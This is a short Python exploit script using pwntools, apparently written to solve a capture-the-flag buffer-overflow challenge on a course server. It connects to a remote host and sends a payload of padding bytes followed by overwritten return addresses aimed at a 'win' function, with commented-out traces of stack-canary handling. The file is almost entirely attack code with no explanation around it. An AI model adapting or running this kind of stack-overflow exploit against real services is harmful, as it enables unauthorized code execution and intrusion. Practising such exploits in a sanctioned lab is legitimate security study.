from pwn import *

context.clear(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

r = remote("cs4401shell.walls.ninja",42733)




winAddr = 0x55555555491a
secAddr = 0x55555555491a + 0x101
offset = 168
canaryLoc = 168 #?
# r.recvall(timeout=1)
# payload = flat({0:code,offset: p64(addrInt)})
# r.sendline(payload)

# r.recvall()
buf = b''

buf += b"A" * 13 + b"A\n"
buf += b"f\n"
buf += b"B" * 104
buf += p64(secAddr)
buf += p64(winAddr)

# payload = flat({canaryLoc:canaryValue}, 'a')
r.recvline()
# r.sendline("a")
# r.sendline('a')
# r.recvline()
r.sendline(buf)
r.recvall()

#r.interactive()
